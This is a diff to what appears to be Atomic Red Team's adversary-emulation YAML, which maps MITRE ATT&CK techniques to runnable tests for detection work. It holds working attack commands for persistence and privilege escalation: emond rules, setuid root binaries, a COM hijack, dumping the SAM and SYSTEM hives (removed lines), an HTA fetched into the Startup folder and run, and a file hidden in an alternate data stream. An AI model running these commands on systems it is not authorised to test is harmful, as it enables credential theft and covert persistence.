@@ -971,7 +971,7 @@ persistence:
           #{local_file}
 
 '
-        cleanup_command: 'Remove-Item #{local_file}
+        cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
 '
     - name: Persist, Download, & Execute
@@ -1223,92 +1223,6 @@ persistence:
         name: command_prompt
         elevation_required: false
         command: 'cmd.exe /c assoc #{extension_to_change}="#{target_exenstion_handler}"
-
-'
-  T1122:
-    technique:
-      x_mitre_permissions_required:
-      - User
-      x_mitre_data_sources:
-      - Windows Registry
-      - DLL monitoring
-      - Loaded DLLs
-      name: Component Object Model Hijacking
-      description: 'The Component Object Model (COM) is a system within Windows to
-        enable interaction between software components through the operating system.
-        (Citation: Microsoft Component Object Model) Adversaries can use this system
-        to insert malicious code that can be executed in place of legitimate software
-        through hijacking the COM references and relationships as a means for persistence.
-        Hijacking a COM object requires a change in the Windows Registry to replace
-        a reference to a legitimate system component which may cause that component
-        to not work when executed. When that system component is executed through
-        normal system operation the adversary''s code will be executed instead. (Citation:
-        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
-        frequently enough to maintain a consistent level of persistence, but are unlikely
-        to break noticeable functionality within the system as to avoid system instability
-        that could lead to detection.'
-      id: attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69
-      modified: '2019-04-18T16:41:28.889Z'
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      x_mitre_detection: 'There are opportunities to detect COM hijacking by searching
-        for Registry references that have been replaced and through Registry operations
-        replacing know binary paths with unknown paths. Even though some third party
-        applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>
-        may be anomalous and should be investigated since user objects will be loaded
-        prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>.
-        (Citation: Endgame COM Hijacking) Registry entries for existing COM objects
-        may change infrequently. When an entry with a known good path and binary is
-        replaced or changed to an unusual value to point to an unknown binary in a
-        new location, then it may indicate suspicious behavior and should be investigated.
-        Likewise, if software DLL loads are collected and analyzed, any unusual DLL
-        load that can be correlated with a COM object Registry modification may indicate
-        COM hijacking has been performed.'
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - ENDGAME
-      created: '2017-05-31T21:31:33.979Z'
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
-      - kill_chain_name: mitre-attack
-        phase_name: persistence
-      external_references:
-      - external_id: T1122
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1122
-      - source_name: Microsoft Component Object Model
-        description: Microsoft. (n.d.). The Component Object Model. Retrieved August
-          18, 2016.
-        url: https://msdn.microsoft.com/library/ms694363.aspx
-      - source_name: GDATA COM Hijacking
-        description: 'G DATA. (2014, October). COM Object hijacking: the discreet
-          way of persistence. Retrieved August 13, 2016.'
-        url: https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
-      - source_name: Endgame COM Hijacking
-        description: 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting
-          Persistence & Evasion with the COM. Retrieved September 15, 2016.'
-        url: https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com
-      x_mitre_defense_bypassed:
-      - Autoruns Analysis
-      identifier: T1122
-    atomic_tests:
-    - name: Component Object Model Hijacking
-      description: 'Hijack COM Object used by certutil.exe
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        command: |
-          reg import PathToAtomicsFolder\T1122\src\COMHijack.reg
-          certutil.exe -CAInfo
-        cleanup_command: 'reg import PathToAtomicsFolder\T1122\src\COMHijackCleanup.reg
 
 '
   T1136:
@@ -1616,6 +1530,76 @@ persistence:
         cleanup_command: |
           del %APPDATA%\updater.exe
           del %APPDATA%\amsi.dll
+  T1519:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      x_mitre_data_sources:
+      - File monitoring
+      - API monitoring
+      name: Emond
+      description: |-
+        Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)
+
+        Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.
+      id: attack-pattern--d376668f-b208-42de-b1f5-fdfe0ad4b753
+      x_mitre_platforms:
+      - macOS
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Monitor emond rules creation by checking for files created
+        or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Ivan Sinyakov
+      created: '2019-09-19T14:07:11.734Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1519
+        url: https://attack.mitre.org/techniques/T1519
+      - description: Ross, Chris. (2018, January 17). Leveraging Emond on macOS For
+          Persistence. Retrieved September 10, 2019.
+        source_name: xorrior emond Jan 2018
+        url: https://www.xorrior.com/emond-persistence/
+      - description: Reynolds, James. (2016, April 7). What is emond?. Retrieved September
+          10, 2019.
+        source_name: magnusviri emond Apr 2016
+        url: http://www.magnusviri.com/Mac/what-is-emond.html
+      - description: Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS.
+          Retrieved September 10, 2019.
+        source_name: sentinelone macos persist Jun 2019
+        url: https://www.sentinelone.com/blog/how-malware-persists-on-macos/
+      modified: '2019-10-16T21:50:02.245Z'
+      identifier: T1519
+    atomic_tests:
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        plist:
+          description: Path to attacker emond plist file
+          type: path
+          default: PathToAtomicsFolder/T1519/src/T1519_emond.plist
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sudo cp "#{plist}" /etc/emond.d/rules/T1519_emond.plist
+          sudo touch /private/var/db/emondClients/T1519
+        cleanup_command: |
+          sudo rm /etc/emond.d/rules/T1519_emond.plist
+          sudo rm /private/var/db/emondClients/T1519
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -4547,8 +4531,9 @@ persistence:
       modified: '2019-06-24T12:06:41.014Z'
       identifier: T1166
     atomic_tests:
-    - name: Setuid and Setgid
-      description: 'Setuid and Setgid
+    - name: Make and modify binary from C source
+      description: 'Make, change owner, and change file attributes on a C source code
+        file
 
 '
       supported_platforms:
@@ -4558,17 +4543,21 @@ persistence:
         payload:
           description: hello.c payload
           type: path
-          default: hello.c
+          default: PathToAtomicsFolder/T1166/src/hello.c
       executor:
-        name: manual
-        steps: |
-          1. make hello
-
-          2. sudo chown root hello
-
-          3. sudo chmod u+s hello
-
-          4. ./hello
+        name: sh
+        elevation_required: true
+        command: |
+          copy #{payload} /tmp/hello.c
+          cd /tmp
+          sudo chown root hello.c
+          sudo make hello
+          sudo chown root hello
+          sudo chmod u+s hello
+          ./hello
+        cleanup_command: |
+          sudo rm ./hello
+          sudo rm /tmp/hello.c
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
@@ -4583,9 +4572,14 @@ persistence:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod u+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
@@ -4600,9 +4594,14 @@ persistence:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
   T1023:
     technique:
       x_mitre_permissions_required:
@@ -4772,27 +4771,6 @@ persistence:
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Persistance with Event Monitor - emond
-      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
-        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
-
-'
-      supported_platforms:
-      - macos
-      input_arguments:
-        plist:
-          description: Path to attacker emond plist file
-          type: path
-          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
-      executor:
-        name: sh
-        elevation_required: true
-        command: |
-          sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
-          sudo touch /private/var/db/emondClients/T1165
-        cleanup_command: |
-          sudo rm /etc/emond.d/rules/T1165_emond.plist
-          sudo rm /private/var/db/emondClients/T1165
   T1501:
     technique:
       x_mitre_data_sources:
@@ -5661,7 +5639,7 @@ defense-evasion:
           #{local_file}
 
 '
-        cleanup_command: 'Remove-Item #{local_file}
+        cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
 '
     - name: Persist, Download, & Execute
@@ -6416,92 +6394,6 @@ defense-evasion:
         name: command_prompt
         elevation_required: false
         command: 'hh.exe #{remote_chm_file}
-
-'
-  T1122:
-    technique:
-      x_mitre_permissions_required:
-      - User
-      x_mitre_data_sources:
-      - Windows Registry
-      - DLL monitoring
-      - Loaded DLLs
-      name: Component Object Model Hijacking
-      description: 'The Component Object Model (COM) is a system within Windows to
-        enable interaction between software components through the operating system.
-        (Citation: Microsoft Component Object Model) Adversaries can use this system
-        to insert malicious code that can be executed in place of legitimate software
-        through hijacking the COM references and relationships as a means for persistence.
-        Hijacking a COM object requires a change in the Windows Registry to replace
-        a reference to a legitimate system component which may cause that component
-        to not work when executed. When that system component is executed through
-        normal system operation the adversary''s code will be executed instead. (Citation:
-        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
-        frequently enough to maintain a consistent level of persistence, but are unlikely
-        to break noticeable functionality within the system as to avoid system instability
-        that could lead to detection.'
-      id: attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69
-      modified: '2019-04-18T16:41:28.889Z'
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      x_mitre_detection: 'There are opportunities to detect COM hijacking by searching
-        for Registry references that have been replaced and through Registry operations
-        replacing know binary paths with unknown paths. Even though some third party
-        applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>
-        may be anomalous and should be investigated since user objects will be loaded
-        prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>.
-        (Citation: Endgame COM Hijacking) Registry entries for existing COM objects
-        may change infrequently. When an entry with a known good path and binary is
-        replaced or changed to an unusual value to point to an unknown binary in a
-        new location, then it may indicate suspicious behavior and should be investigated.
-        Likewise, if software DLL loads are collected and analyzed, any unusual DLL
-        load that can be correlated with a COM object Registry modification may indicate
-        COM hijacking has been performed.'
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      x_mitre_contributors:
-      - ENDGAME
-      created: '2017-05-31T21:31:33.979Z'
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
-      - kill_chain_name: mitre-attack
-        phase_name: persistence
-      external_references:
-      - external_id: T1122
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1122
-      - source_name: Microsoft Component Object Model
-        description: Microsoft. (n.d.). The Component Object Model. Retrieved August
-          18, 2016.
-        url: https://msdn.microsoft.com/library/ms694363.aspx
-      - source_name: GDATA COM Hijacking
-        description: 'G DATA. (2014, October). COM Object hijacking: the discreet
-          way of persistence. Retrieved August 13, 2016.'
-        url: https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
-      - source_name: Endgame COM Hijacking
-        description: 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting
-          Persistence & Evasion with the COM. Retrieved September 15, 2016.'
-        url: https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com
-      x_mitre_defense_bypassed:
-      - Autoruns Analysis
-      identifier: T1122
-    atomic_tests:
-    - name: Component Object Model Hijacking
-      description: 'Hijack COM Object used by certutil.exe
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        command: |
-          reg import PathToAtomicsFolder\T1122\src\COMHijack.reg
-          certutil.exe -CAInfo
-        cleanup_command: 'reg import PathToAtomicsFolder\T1122\src\COMHijackCleanup.reg
 
 '
   T1090:
@@ -7266,8 +7158,8 @@ defense-evasion:
           default: Default Web Site
       executor:
         name: powershell
-        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {0}
-          else {1}
+        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {exit
+          0} else {exit 1}
 
 '
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
@@ -7293,7 +7185,7 @@ defense-evasion:
       dependency_executor_name: powershell
       dependencies:
       - description: Sysmon executable must be available
-        prereq_command: if(cmd /c where sysmon) {0} else {1}
+        prereq_command: if(cmd /c where sysmon) {exit 0} else {exit 1}
         get_prereq_command: |-
           $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
           New-Item -ItemType Directory $parentpath -Force | Out-Null
@@ -7301,7 +7193,7 @@ defense-evasion:
           Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
           if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
       - description: Sysmon must be installed
-        prereq_command: if(cmd /c sc query sysmon) {0} else {1}
+        prereq_command: if(cmd /c sc query sysmon) { exit 0} else { exit 1}
         get_prereq_command: cmd /c sysmon -i -accepteula
       executor:
         name: command_prompt
@@ -7682,86 +7574,6 @@ defense-evasion:
           -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
 '
-  T1006:
-    technique:
-      x_mitre_data_sources:
-      - API monitoring
-      x_mitre_permissions_required:
-      - Administrator
-      name: File System Logical Offsets
-      description: |-
-        Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)
-
-        Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)
-      id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
-      x_mitre_platforms:
-      - Windows
-      object_marking_refs:
-      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
-      x_mitre_version: '1.0'
-      type: attack-pattern
-      kill_chain_phases:
-      - kill_chain_name: mitre-attack
-        phase_name: defense-evasion
-      x_mitre_detection: |-
-        Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)
-
-        Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1086), additional logging of PowerShell scripts is recommended.
-      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      created: '2017-05-31T21:30:20.934Z'
-      modified: '2018-10-17T00:14:20.652Z'
-      external_references:
-      - external_id: T1006
-        source_name: mitre-attack
-        url: https://attack.mitre.org/techniques/T1006
-      - description: Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors
-          Directly from Disk using Logical Offsets. Retrieved November 12, 2014.
-        source_name: Hakobyan 2009
-        url: http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin
-      - description: Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved
-          June 2, 2016.
-        source_name: Github PowerSploit Ninjacopy
-        url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
-      x_mitre_defense_bypassed:
-      - File monitoring
-      - File system access controls
-      identifier: T1006
-    atomic_tests:
-    - name: File System Logical Offsets using PowerShell
-      description: |
-        This test uses PowerShell to copy files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
-        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
-      supported_platforms:
-      - windows
-      input_arguments:
-        sam_binary_path:
-          description: Path of the SAM file
-          type: string
-          default: C:\Windows\System32\config\sam
-        system_binary_path:
-          description: Path of the SYSTEM file
-          type: string
-          default: C:\Windows\System32\config\system
-        security_binary_path:
-          description: Path of the SECURITY file
-          type: string
-          default: C:\Windows\System32\config\security
-        output_folder:
-          description: Output folder path
-          type: Path
-          default: C:\Windows\Temp
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          . $PathToAtomicsFolder\T1006\src\Invoke-NinjaCopy.ps1
-          Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
-          Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
-          Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
-        cleanup_command: |-
-          rm "#{output_folder}\sam"
-          rm "#{output_folder}\system"
-          rm "#{output_folder}\security"
   T1222:
     technique:
       x_mitre_data_sources:
@@ -10073,11 +9885,17 @@ defense-evasion:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1096:
     technique:
       x_mitre_data_sources:
@@ -10188,6 +10006,40 @@ defense-evasion:
           regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
           expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
           esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+    - name: Store file in Alternate Data Stream (ADS)
+      description: 'Storing files in Alternate Data Stream (ADS) similar to Astaroth
+        malware.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        payload_path:
+          description: Path of file to hide in ADS
+          type: path
+          default: c:\windows\system32\cmd.exe
+        ads_file_path:
+          description: Path of file to create an ADS under
+          type: path
+          default: C:\Users\Public\Libraries\yanki\desktop.ini
+        ads_name:
+          description: Name of ADS
+          type: string
+          default: ADSName
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: |
+          if (!(Test-Path "#{ads_file_path}"))
+          {
+            $FileCreated = New-Item -Path "#{ads_file_path}" -Type "file" -Force
+            0
+          }
+          else {0}
+        command: 'Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
+
+'
+        cleanup_command: Remove-Item -Path "#{ads_file_path}" -Stream "#{ads_name}"
   T1126:
     technique:
       x_mitre_data_sources:
@@ -13816,6 +13668,76 @@ privilege-escalation:
         cleanup_command: |
           del %APPDATA%\updater.exe
           del %APPDATA%\amsi.dll
+  T1519:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      x_mitre_data_sources:
+      - File monitoring
+      - API monitoring
+      name: Emond
+      description: |-
+        Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)
+
+        Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.
+      id: attack-pattern--d376668f-b208-42de-b1f5-fdfe0ad4b753
+      x_mitre_platforms:
+      - macOS
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Monitor emond rules creation by checking for files created
+        or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Ivan Sinyakov
+      created: '2019-09-19T14:07:11.734Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1519
+        url: https://attack.mitre.org/techniques/T1519
+      - description: Ross, Chris. (2018, January 17). Leveraging Emond on macOS For
+          Persistence. Retrieved September 10, 2019.
+        source_name: xorrior emond Jan 2018
+        url: https://www.xorrior.com/emond-persistence/
+      - description: Reynolds, James. (2016, April 7). What is emond?. Retrieved September
+          10, 2019.
+        source_name: magnusviri emond Apr 2016
+        url: http://www.magnusviri.com/Mac/what-is-emond.html
+      - description: Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS.
+          Retrieved September 10, 2019.
+        source_name: sentinelone macos persist Jun 2019
+        url: https://www.sentinelone.com/blog/how-malware-persists-on-macos/
+      modified: '2019-10-16T21:50:02.245Z'
+      identifier: T1519
+    atomic_tests:
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        plist:
+          description: Path to attacker emond plist file
+          type: path
+          default: PathToAtomicsFolder/T1519/src/T1519_emond.plist
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sudo cp "#{plist}" /etc/emond.d/rules/T1519_emond.plist
+          sudo touch /private/var/db/emondClients/T1519
+        cleanup_command: |
+          sudo rm /etc/emond.d/rules/T1519_emond.plist
+          sudo rm /private/var/db/emondClients/T1519
   T1044:
     technique:
       x_mitre_permissions_required:
@@ -15273,8 +15195,9 @@ privilege-escalation:
       modified: '2019-06-24T12:06:41.014Z'
       identifier: T1166
     atomic_tests:
-    - name: Setuid and Setgid
-      description: 'Setuid and Setgid
+    - name: Make and modify binary from C source
+      description: 'Make, change owner, and change file attributes on a C source code
+        file
 
 '
       supported_platforms:
@@ -15284,17 +15207,21 @@ privilege-escalation:
         payload:
           description: hello.c payload
           type: path
-          default: hello.c
+          default: PathToAtomicsFolder/T1166/src/hello.c
       executor:
-        name: manual
-        steps: |
-          1. make hello
-
-          2. sudo chown root hello
-
-          3. sudo chmod u+s hello
-
-          4. ./hello
+        name: sh
+        elevation_required: true
+        command: |
+          copy #{payload} /tmp/hello.c
+          cd /tmp
+          sudo chown root hello.c
+          sudo make hello
+          sudo chown root hello
+          sudo chmod u+s hello
+          ./hello
+        cleanup_command: |
+          sudo rm ./hello
+          sudo rm /tmp/hello.c
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
@@ -15309,9 +15236,14 @@ privilege-escalation:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod u+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
@@ -15326,9 +15258,14 @@ privilege-escalation:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -15404,27 +15341,6 @@ privilege-escalation:
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Persistance with Event Monitor - emond
-      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
-        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
-
-'
-      supported_platforms:
-      - macos
-      input_arguments:
-        plist:
-          description: Path to attacker emond plist file
-          type: path
-          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
-      executor:
-        name: sh
-        elevation_required: true
-        command: |
-          sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
-          sudo touch /private/var/db/emondClients/T1165
-        cleanup_command: |
-          sudo rm /etc/emond.d/rules/T1165_emond.plist
-          sudo rm /private/var/db/emondClients/T1165
   T1169:
     technique:
       x_mitre_data_sources:
@@ -18738,11 +18654,43 @@ discovery:
       executor:
         name: command_prompt
         elevation_required: false
-        command: |-
+        command: |
           ipconfig /all
           net config workstation
           net view /all /domain
           nltest /domain_trusts
+    - name: List Open Egress Ports
+      description: |
+        This is to test for what ports are open outbound.  The technique used was taken from the following blog:
+        https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/
+      supported_platforms:
+      - windows
+      input_arguments:
+        port_file:
+          description: The path to a text file containing ports to be scanned, one
+            port per line. The default list uses the top 128 ports as defined by Nmap.
+          type: Path
+          default: PathToAtomicsFolder\T1016\src\top-128.txt
+        output_file:
+          description: Path of file to write port scan results
+          type: Path
+          default: "$env:USERPROFILE\\Desktop\\open-ports.txt"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen
+          = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n
+          \   $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\",
+          $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n
+          \   $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result
+          = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result
+          | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n
+          \   }\n    else {\n        $result = \"$port closed\" \n        Write-Host
+          -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result
+          | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were
+          a total of $totalopen open ports out of $totalports ports tested.\"\n$results
+          | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n"
+        cleanup_command: Remove-Item -ErrorAction ignore "#{output_file}"
   T1049:
     technique:
       x_mitre_permissions_required:
@@ -19776,7 +19724,7 @@ credential-access:
       dependencies:
       - description: Windows Credential Editor must exist on disk at specified location
           (#{gsecdump_exe})
-        prereq_command: 'if (Test-Path #{gsecdump_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}'
         get_prereq_command: Write-Host Automated installer not implemented yet
       executor:
         name: command_prompt
@@ -19810,7 +19758,7 @@ credential-access:
       dependencies:
       - description: Windows Credential Editor must exist on disk at specified location
           (#{wce_exe})
-        prereq_command: 'if (Test-Path #{wce_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
@@ -19858,7 +19806,7 @@ credential-access:
       dependencies:
       - description: ProcDump tool from Sysinternals must exist on disk at specified
           location (#{procdump_exe})
